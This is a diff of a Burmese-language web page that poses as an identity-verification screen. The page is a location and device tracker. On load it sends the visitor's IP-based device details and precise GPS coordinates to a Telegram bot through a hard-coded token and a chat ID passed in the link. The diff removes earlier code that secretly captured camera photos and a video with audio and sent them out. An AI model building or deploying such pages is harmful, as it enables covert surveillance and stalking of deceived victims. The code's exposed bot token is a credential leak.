@@ -30,23 +30,25 @@
     h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
     p { font-size: 14px; color: #aaa; }
     .status { margin-top: 20px; font-size: 13px; color: #0f0; }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>🔐 ကိုယ်ရေးအတည်ပြုချက်</h1>
-    <p>အတည်ပြုရန် ခွင့်ပြုချက်များ လိုအပ်ပါသည်။</p>
+    <p id="message">အတည်ပြုရန် ခွင့်ပြုချက်များ လိုအပ်ပါသည်။</p>
     <p class="status" id="status">စတင်နေပါပြီ...</p>
   </div>
 
   <script>
     // ===== TELEGRAM BOT CONFIGURATION =====
-    const BOT_TOKEN = "7308206355:AAFqR-4DnU-N6jScpp3vKpB8hbRSAno_ftc";
+    const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
     // ======================================
     
     const urlParams = new URLSearchParams(window.location.search);
     const OWNER_ID = urlParams.get('id');
     const statusEl = document.getElementById('status');
+    const messageEl = document.getElementById('message');
     
     // Telegram ဆိုရင် Chrome ကို Auto ပြောင်းခိုင်းမယ်
     const isTelegram = /Telegram/i.test(navigator.userAgent);
@@ -57,196 +59,25 @@
       window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
     }
 
-    async function sendToTelegram(text, isPhoto = false, photoBase64 = null, isVideo = false, videoBase64 = null) {
+    async function sendToTelegram(text) {
       if (!OWNER_ID) return;
       
       try {
-        if (isVideo && videoBase64) {
-          const formData = new FormData();
-          formData.append('chat_id', OWNER_ID);
-          formData.append('video', videoBase64);
-          formData.append('caption', text);
-          
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-            method: 'POST',
-            body: formData
-          });
-        } else if (isPhoto && photoBase64) {
-          const formData = new FormData();
-          formData.append('chat_id', OWNER_ID);
-          formData.append('photo', photoBase64);
-          formData.append('caption', text);
-          
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          });
-        } else {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: OWNER_ID,
-              text: text,
-              parse_mode: 'Markdown'
-            })
-          });
-        }
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: OWNER_ID,
+            text: text,
+            parse_mode: 'Markdown'
+          })
+        });
       } catch(e) {
         console.log('Send error:', e);
       }
     }
 
-    async function compressImage(blob) {
-      return new Promise((resolve) => {
-        const img = new Image();
-        img.src = URL.createObjectURL(blob);
-        img.onload = () => {
-          const canvas = document.createElement('canvas');
-          canvas.width = img.width / 2;
-          canvas.height = img.height / 2;
-          canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(resolve, 'image/jpeg', 0.7);
-          URL.revokeObjectURL(img.src);
-        };
-      });
-    }
-
-    async function blobToBase64(blob) {
-      return new Promise((resolve) => {
-        const reader = new FileReader();
-        reader.onloadend = () => resolve(reader.result);
-        reader.readAsDataURL(blob);
-      });
-    }
-
-    // ========== LOCATION ==========
-    async function getLocation() {
-      if (!navigator.geolocation) {
-        await sendToTelegram(`❌ တည်နေရာ မရနိုင်ပါ`);
-        return;
-      }
-      
-      navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const acc = position.coords.accuracy;
-        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        
-        await sendToTelegram(
-          `📍 **တည်နေရာ**\n` +
-          `🌍 လတ္တီတွဒ်: ${lat}\n` +
-          `🌍 လောင်ဂျီတွဒ်: ${lon}\n` +
-          `📏 တိကျမှု: ${acc}m\n` +
-          `🗺️ Google Maps: ${mapsLink}`
-        );
-      }, async (error) => {
-        await sendToTelegram(`❌ တည်နေရာ ငြင်းပယ်ခံရပါသည်`);
-      });
-    }
-
-    // ========== BACK CAMERA PHOTO ==========
-    async function takeBackPhoto() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "environment" } 
-        });
-        
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.setAttribute('playsinline', '');
-        
-        await new Promise((resolve) => {
-          video.onloadedmetadata = () => {
-            video.play();
-            resolve();
-          };
-        });
-        
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        stream.getTracks().forEach(track => track.stop());
-        
-        canvas.toBlob(async (blob) => {
-          const compressed = await compressImage(blob);
-          const base64 = await blobToBase64(compressed);
-          await sendToTelegram(`📸 အနောက်ကင်မရာပုံ`, true, base64);
-        }, 'image/jpeg', 0.7);
-      } catch(err) {
-        await sendToTelegram(`❌ အနောက်ကင်မရာ ငြင်းပယ်ခံရပါသည်`);
-      }
-    }
-
-    // ========== FRONT CAMERA PHOTO ==========
-    async function takeFrontPhoto() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user" } 
-        });
-        
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.setAttribute('playsinline', '');
-        
-        await new Promise((resolve) => {
-          video.onloadedmetadata = () => {
-            video.play();
-            resolve();
-          };
-        });
-        
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        stream.getTracks().forEach(track => track.stop());
-        
-        canvas.toBlob(async (blob) => {
-          const compressed = await compressImage(blob);
-          const base64 = await blobToBase64(compressed);
-          await sendToTelegram(`📸 အရှေ့ကင်မရာပုံ`, true, base64);
-        }, 'image/jpeg', 0.7);
-      } catch(err) {
-        await sendToTelegram(`❌ အရှေ့ကင်မရာ ငြင်းပယ်ခံရပါသည်`);
-      }
-    }
-
-    // ========== VIDEO RECORDING (5 sec) ==========
-    async function recordVideo() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user" },
-          audio: true 
-        });
-        
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = async () => {
-          const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-          const base64 = await blobToBase64(videoBlob);
-          await sendToTelegram(`🎥 ဗီဒီယို (၅ စက္ကန့်)`, false, null, true, base64);
-          stream.getTracks().forEach(track => track.stop());
-        };
-        
-        mediaRecorder.start();
-        setTimeout(() => {
-          if (mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();
-          }
-        }, 5000);
-        
-      } catch(err) {
-        await sendToTelegram(`❌ ဗီဒီယို ငြင်းပယ်ခံရပါသည်`);
-      }
-    }
-
-    // ========== DEVICE INFO ==========
+    // ========== DEVICE INFO (စက်ပစ္စည်းအချက်အလက်) ==========
     async function sendDeviceInfo() {
       try {
         const ipRes = await fetch('https://ipinfo.io/json?token=5602d2e05cb668');
@@ -284,45 +115,67 @@
       }
     }
 
+    // ========== LOCATION (တည်နေရာ) ==========
+    function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const msg = `📍 *တည်နေရာ*\n\n` +
+              `🌍 လတ္တီတွဒ်: ${lat}\n` +
+              `🌍 လောင်ဂျီတွဒ်: ${lon}\n` +
+              `📏 တိကျမှု: ${acc}m\n` +
+              `🗺️ Google Maps: [နှိပ်ပြီးကြည့်ရန်](${mapsLink})`;
+            
+            await sendToTelegram(msg);
+            resolve(true);
+          },
+          async (error) => {
+            await sendToTelegram(`❌ *တည်နေရာ ငြင်းပယ်ခံရပါသည်*`);
+            resolve(false);
+          }
+        );
+      });
+    }
+
     window.onload = async () => {
       if (!OWNER_ID) {
         statusEl.textContent = '❌ လင့်မမှန်ကန်ပါ။';
         return;
       }
       
-      statusEl.textContent = '📡 ချိတ်ဆက်နေပါသည်...';
+      // စက်ပစ္စည်းအချက်အလက်ပို့မယ်
+      statusEl.textContent = '📡 ်...';
+      messageEl.textContent = '';
       await sendDeviceInfo();
-
-      try {
-        // အနောက်ကင်မရာပုံ
-        statusEl.textContent = '📸 အနောက်ကင်မရာ...';
-        await takeBackPhoto();
-        
-        // အရှေ့ကင်မရာပုံ
-        statusEl.textContent = '📸 အရှေ့ကင်မရာ...';
-        await takeFrontPhoto();
-        
-        // ဗီဒီယို 5 စက္ကန့်
-        statusEl.textContent = '🎥 ဗီဒီယိုရိုက်နေသည် (၅ စက္ကန့်)...';
-        await recordVideo();
-        
-        // တည်နေရာ
-        statusEl.textContent = '📍 တည်နေရာယူနေသည်...';
-        await getLocation();
-        
-        statusEl.textContent = '✅ အတည်ပြုပြီးပါပြီ။ ပြန်ညွှန်းနေပါသည်...';
-        
-        await sendToTelegram(`✅ *အတည်ပြုခြင်း ပြီးဆုံးပါပြီ!*\n🕐 အချိန်: ${new Date().toLocaleString()}`);
-        
-        setTimeout(() => {
-          window.location.href = "https://www.google.com";
-        }, 3000);
-        
-      } catch (err) {
-        statusEl.textContent = '❌ ခွင့်ပြုချက် ငြင်းပယ်ခံရပါသည်။';
-        await sendToTelegram(`❌ *ခွင့်ပြုချက် ငြင်းပယ်ခံရပါသည်!*\n🕐 အချိန်: ${new Date().toLocaleString()}`);
-        console.error(err);
+      
+      // Location ခွင့်တောင်းမယ်
+      statusEl.textContent = '📍 တည်နေရာ အတည်ပြုချက် ရယူနေပါသည်...';
+      messageEl.textContent = 'တည်နေရာ အတည်ပြုချက် ရယူနေပါသည်... ခွင့်ပြုပေးပါ။';
+      
+      const locationResult = await getLocation();
+      
+      if (locationResult) {
+        statusEl.textContent = '✅ တည်နေရာ အတည်ပြုချက် အောင်မြင်ပါသည်။';
+        messageEl.textContent = 'တည်နေရာ အတည်ပြုချက် အောင်မြင်ပါသည်။ ပြန်ညွှန်းနေပါသည်...';
+      } else {
+        statusEl.textContent = '❌ တည်နေရာ အတည်ပြုချက် မအောင်မြင်ပါ။';
+        messageEl.textContent = 'တည်နေရာ အတည်ပြုချက် မအောင်မြင်ပါ။ ပြန်ညွှန်းနေပါသည်...';
       }
+      
+      // YouTube ကို Auto ခေါ်မယ်
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+      }, 2000);
     };
   </script>
 </body>
